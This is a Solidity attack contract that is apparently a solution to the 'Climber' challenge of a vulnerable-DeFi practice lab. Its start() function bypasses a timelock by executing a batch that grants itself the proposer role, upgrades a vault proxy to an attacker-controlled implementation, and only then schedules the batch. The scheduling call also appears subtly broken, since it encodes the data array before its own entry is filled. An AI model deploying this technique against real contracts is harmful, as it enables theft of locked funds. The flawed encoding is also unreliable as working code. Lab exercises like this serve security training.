// SPDX-License-Identifier: GPL-2.0+
pragma solidity ^0.8.3;
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "hardhat/console.sol";
import "./ClimberTimelock.sol";
import "./ClimberVaultV2.sol";

contract ClimberAttack is Ownable{
    ClimberTimelock private _climberTimelock;
    UUPSUpgradeable private _upgradeable;
    constructor(address payable climberTimelockAddress, address upgradeableAddress) Ownable(){
        _climberTimelock = ClimberTimelock(climberTimelockAddress);
        _upgradeable = UUPSUpgradeable(upgradeableAddress);
    }

    function start() onlyOwner public {
        console.log("start address(this) is %s", address(this));
        ClimberVaultV2 vaultV2 = new ClimberVaultV2();
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);
        bytes32 salt = "Hello World";
        targets[0] = address(_climberTimelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("grantRole(bytes32,address)",
                                _climberTimelock.PROPOSER_ROLE(), address(_climberTimelock));
        targets[1] = address(_upgradeable);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("upgradeTo(address)", address(vaultV2));
        targets[2] = address(_climberTimelock);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("schedule(address[],uint256[],bytes[],bytes32)",
                                targets, values, dataElements, salt);
        _climberTimelock.execute(targets, values, dataElements, salt);
    }

}
